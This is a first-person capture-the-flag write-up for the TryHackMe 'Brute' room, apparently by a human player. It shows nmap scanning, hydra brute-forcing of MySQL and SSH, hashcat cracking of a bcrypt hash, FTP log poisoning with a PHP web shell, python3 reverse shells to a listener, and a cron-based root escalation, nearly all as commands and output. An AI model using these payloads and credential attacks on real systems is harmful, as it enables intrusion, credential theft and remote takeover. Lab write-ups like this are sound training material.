## Brute 

Room link: ```https://tryhackme.com/room/ettubrute```

## Scanning 
I first started with an aggressive NMAP scan. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-24 20:34 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.081s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.00 seconds
```
A full port scan revealed interest information as well. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -p- [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-24 20:36 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.076s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 23.70 seconds
```
I wanted to narrow down and look at SQL specifically. 
```
ajread@aj-ubuntu:~/TryHackMe$ nmap -A -p [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-24 20:39 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.077s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 19
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSigpipes, Support41Auth, Speaks41ProtocolOld, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, FoundRows, Speaks41ProtocolNew, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 5\x0D`\x18,*\x1D_~7{\x0Bj\x1E&
| x<\x18\x0B
|_  Auth Plugin Name: caching_sha2_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
```
First looking at the webserver using gobuster. 
```
ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://[REMOTE IP] -w ~/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://[REMOTE IP]/
[+] Threads      : 10
[+] Wordlist     : /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2022/10/24 20:49:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
=====================================================
2022/10/24 20:50:35 Finished
=====================================================
```
Even Nikto did not really provide much information for me to use. 
```
ajread@aj-ubuntu:~/TryHackMe$ nikto -h [REMOTE IP]
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          [REMOTE IP]
+ Target Hostname:    [REMOTE IP]
+ Target Port:        80
+ Start Time:         2022-10-24 20:51:13 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-10-24 21:00:16 (GMT-4) (543 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
However, I wanted to hone in on the mysql instance with nmap. 
```
ajread@aj-ubuntu:~/apps$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [REMOTE IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2022-10-25 20:46 EDT
Nmap scan report for [REMOTE IP]
Host is up (0.074s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.28-0ubuntu0.20.04.3
|   Thread ID: 26
|   Capabilities flags: 65535
|   Some Capabilities: IgnoreSpaceBeforeParenthesis, SupportsTransactions, LongPassword, Support41Auth, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolNew, ODBCClient, InteractiveClient, SwitchToSSLAfterHandshake, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, Speaks41ProtocolOld, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: P,n'%\x04\x1FS\x0C@11fy\x1FAN\x059t
|_  Auth Plugin Name: caching_sha2_password
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.76 seconds
```
I attempted a bruteforce to mysql with the usernames that I found from the nmap scripting engine. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ hydra -L users.txt -P ~/resources/wordlists/rockyou.txt 10.10.6.223 mysql
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-03 19:12:37
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 143443980 login tries (l:10/p:14344398), ~35860995 tries per task
[DATA] attacking mysql://10.10.6.223:3306/
[3306][mysql] host: 10.10.6.223   login: root   password: rockyou
```
It looked like I got credentials for a user with mysql.
## Initial Access
I was able to authenticate with the credentials provided to me from hydra. 
```
ajread@aj-ubuntu:~$ mysql -h [REMOTE IP] -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 320
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```
I wanted to see what databases I could look at. 
```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.20 sec)
```
I was able to interact with the database to find user credentials within the user table of website. 
```
mysql> use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| website            |
+--------------------+
5 rows in set (0.11 sec)

mysql> SHOW TABLES;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.07 sec)

mysql> DESCRIBE users;
+------------+--------------+------+-----+-------------------+-------------------+
| Field      | Type         | Null | Key | Default           | Extra             |
+------------+--------------+------+-----+-------------------+-------------------+
| id         | int          | NO   | PRI | NULL              | auto_increment    |
| username   | varchar(50)  | NO   | UNI | NULL              |                   |
| password   | varchar(255) | NO   |     | NULL              |                   |
| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED |
+------------+--------------+------+-----+-------------------+-------------------+
4 rows in set (0.34 sec)

mysql> SELECT * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | Adrian   | $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we | 2021-10-20 02:43:42 |
+----+----------+--------------------------------------------------------------+---------------------+
1 row in set (0.16 sec)

```
I passed the hash to hashcat to crack and it recovered the password. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ hashcat -a 0 -m 3200 hash.txt ~/resources/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz, 6819/13703 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /home/ajread/resources/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 0 secs

$2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSYxz0SKn4we:tigger
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$tLzQuuQ.h6zBuX8dV83zmu9pFlGt3EF9gQO4aJ8KdnSY...SKn4we
Time.Started.....: Thu Nov  3 19:29:47 2022, (1 sec)
Time.Estimated...: Thu Nov  3 19:29:48 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/ajread/resources/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       47 H/s (5.18ms) @ Accel:8 Loops:64 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32/14344384 (0.00%)
Rejected.........: 0/32 (0.00%)
Restore.Point....: 24/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:960-1024
Candidate.Engine.: Device Generator
Candidates.#1....: tigger -> butterfly
Hardware.Mon.#1..: Temp: 70c Util: 73%

Started: Thu Nov  3 19:29:45 2022
Stopped: Thu Nov  3 19:29:50 2022
```
The password allowed me to log into the website on port 80. The website had one button to ask for Logs from the system, which appeared to be related to authentication attempts through FTP on port 21. With help from the medium post in the ```Assistance``` section, I needed to poison the FTP logs using php code which can execute in the browser. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ ftp [REMOTE IP]
Connected to [REMOTE IP].
220 (vsFTPd 3.0.3)
Name ([REMOTE IP]:ajread): '<?php system($_GET['c']); ?>'
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.
```
Within the url, I could add commands that I would like to execute like whoami. 
```
http://[REMOTE IP]/welcome.php?c=whoami;
```
And it would output my user within the log data. 
```
Thu Nov 3 23:54:08 2022 [pid 3323] ['www-data '] FAIL LOGIN: Client "::ffff:10.6.6.138"
```
I changed the the url to return a reverse shell back to my machine in python3. 
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
I needed to url encode the reverse shell as well. 
```
python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22[LOCAL IP]%22%2C9999%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
After placing the url encoded reverse shell in the url, I entered the url and pressed the log button which returned me a shell.
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on [REMOTE IP] 38750
www-data@brute:/var/www/html$ whoami
whoami
www-data
www-data@brute:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
I was dropped into the ```/var/www/html``` directory. The directory contained an interesting config file. 
```
www-data@brute:/var/www/html$ ls -la
ls -la
total 28
drwxr-xr-x 2 www-data root 4096 Nov 23  2021 .
drwxr-xr-x 3 root     root 4096 Oct 20  2021 ..
-rw-rw-r-- 1 www-data root  487 Oct 20  2021 config.php
-rw-rw-r-- 1 www-data root 4636 Oct 20  2021 index.php
-rw-rw-r-- 1 www-data root  223 Oct 20  2021 logout.php
-rw-rw-r-- 1 www-data root 1066 Nov 23  2021 welcome.php
```
The ```config.php``` contained credentials for user ```adrian```. 
```
www-data@brute:/var/www/html$ cat config.php
cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'adrian');
define('DB_PASSWORD', '[REDACTED]');
define('DB_NAME', 'website');
 
/* Attempt to connect to MySQL database */
$mysqli = new mysqli(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($mysqli === false){
    die("ERROR: Could not connect. " . $mysqli->connect_error);
}
?>
```
I logged into the instance of mysql on localhost but it didnt return anything valuable. Instead, I wanted to see what files I could read on the machine. 
```
www-data@brute:/var/www/html$ find /home/adrian -type f -readable 
find /home/adrian -type f -readable 
/home/adrian/.profile
/home/adrian/.bashrc
/home/adrian/.bash_logout
/home/adrian/.selected_editor
find: ‘/home/adrian/.cache’: Permission denied
/home/adrian/.sudo_as_admin_successful
/home/adrian/.reminder
```
The reminder file was interesting. 
```
www-data@brute:/var/www/html$ cat /home/adrian/.reminder
cat /home/adrian/.reminder
Rules:
best of 64
+ exclamation

ettubrute
```
With some pointers from the writeup in assistance, I used the best64 rule from hashcat to generate a wordlist to brute force ssh. I first created an input file containing words from the hint. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat brute_words.txt 
ettubrute
ettubrute!
```
Then, I ran hashcat using the best64 rule to set a new text file. 
```
hashcat --force brute_words.txt -r /usr/share/hashcat/rules/best64.rule --stdout > best64brutus.txt
```
The best64brutus.txt looked like various permutations and combinations of the input. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ cat best64brutus.txt 
ettubrute
eturbutte
ETTUBRUTE
Ettubrute
ettubrute0
ettubrute1
ettubrute2
ettubrute3
ettubrute4
ettubrute5
ettubrute6
ettubrute7
ettubrute8
ettubrute9
ettubrute00
ettubrute01
ettubrute02
ettubrute11
ettubrute12
ettubrute13
ettubrute21
ettubrute22
ettubrute23
ettubrute69
ettubrute77
ettubrute88
ettubrute99
ettubrute123
ettubrutee
ettubrutes
ettubruta
ettubrus
ettubrua
ettubruer
ettubruie
ettubro
ettubry
ettubr123
ettubrman
ettubrdog
1ettubrute
theettubrute
dttubrute
matubrute
ettubrute
ettubrute
3ttubrut3
etubrute
etbrute
ettbrute
etturute
ettb
ettub1
ettubrut
ettubru
ettubr
ettubrettubr
etubr
bsut
etubrut
ettubre
sttubru
uteettubr
rute
brute
ubruubru
cttu
ubeube
mttubrute
hubrute
ettuut
ettbettb
ube
etttettt
etut
ettubu
erutee
ettubrute!
!eturbutte
ETTUBRUTE!
Ettubrute!
ettubrute!0
ettubrute!1
ettubrute!2
ettubrute!3
ettubrute!4
ettubrute!5
ettubrute!6
ettubrute!7
ettubrute!8
ettubrute!9
ettubrute!00
ettubrute!01
ettubrute!02
ettubrute!11
ettubrute!12
ettubrute!13
ettubrute!21
ettubrute!22
ettubrute!23
ettubrute!69
ettubrute!77
ettubrute!88
ettubrute!99
ettubrute!123
ettubrute!e
ettubrute!s
ettubrutea
ettubruts
ettubruta
ettubruter
ettubrutie
ettubruo
ettubruy
ettubru123
ettubruman
ettubrudog
1ettubrute!
theettubrute!
dttubrute!
matubrute!
ettubrute!
ettubrute!
3ttubrut3!
etubrute!
etbrute!
ettbrute!
etturute!
ettb
ettub1
ettubrute
ettubrut
ettubru
ettubruettubru
etubru
sute
e!tubrut
ettubru!
dttubrut
te!ettubru
ute!
rute!
brutbrut
cttu
ubeube
mttubrute!
hubrute!
ettuut
ettbettb
ube
etetetet
e!ut
ettubu
erute!
```
I was able to guess the password for the user, ```adrian```. 
```
ajread@aj-ubuntu:~/TryHackMe/practice$ hydra -l adrian -P best64brutus.txt [REMOTE IP] ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-05 20:43:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 154 login tries (l:1/p:154), ~10 tries per task
[DATA] attacking ssh://[REMOTE IP]:22/
[22][ssh] host: [REMOTE IP]  login: adrian   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-05 20:44:13
```
With that information, I authenticated to the target using ssh. 
```
adrian@brute:~$ whoami
adrian
adrian@brute:~$ id
uid=1000(adrian) gid=1000(adrian) groups=1000(adrian)
```
And I was able to recover the flag. 
```
adrian@brute:~$ wc -c user.txt 
21 user.txt
```
## Privilege Escalation 
I dropped linpeas on to the target machine by setting up a webserver on my local machine.
```
ajread@aj-ubuntu:~/resources/peas$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
[REMOTE IP] - - [05/Nov/2022 20:48:04] "GET /linpeas.sh HTTP/1.1" 200 -
```
I then executed linpeas within the temp folder and saved the output to a file.
```
adrian@brute:/tmp$ ./linpeas.sh -a > linpeas_output.txt
```
There is an interesting file within the home directory of the adrian user that looks like a punch card where it echoes the date to a file. 
```
adrian@brute:~$ cat punch_in.sh 
#!/bin/bash

/usr/bin/echo 'Punched in at '$(/usr/bin/date +"%H:%M") >> /home/adrian/punch_in
```
It looks like root executes the bash script called ```punch_in.sh``` to write to ```punch_in``` every minute. 
```
adrian@brute:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

*/1 * * * * /usr/bin/bash /home/adrian/punch_in.sh
```
There was also the script file within the ftp folder that shows that the user, adrian, executes each line of ```punch_in``` as well. As user adrian, I was able to write to the ```punch_in``` file, which can allow me to execute something as root. 
```
adrian@brute:~/ftp/files$ cat script 
#!/bin/sh
while read line;
do
  /usr/bin/sh -c "echo $line";
done < /home/adrian/punch_in
```
All I needed to do was write to the ```punch_in``` file with a reverse shell and it would execute. So, I set up a reverse shell in python3 and placed it in the ```punch_in``` file. 
```
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[LOCAL IP]",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
```
I started a listener on the port for the reverse shell and got a call back as root. 
```
ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 8888
Listening on 0.0.0.0 8888
Connection received on [REMOTE IP] 51282
root@brute:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@brute:~# whoami
whoami
root
```
And I got the root flag.
```
root@brute:~# wc -c root.txt
wc -c root.txt
34 root.txt
```
Thank you so much to Madfoxsec for the medium post in the ```Assistance``` section. 
## Assistance

I got some help and tips from https://medium.com/@madfoxsec/brute-thm-writeup-2d50f2f29fc3 to specifically look at MySQL. 

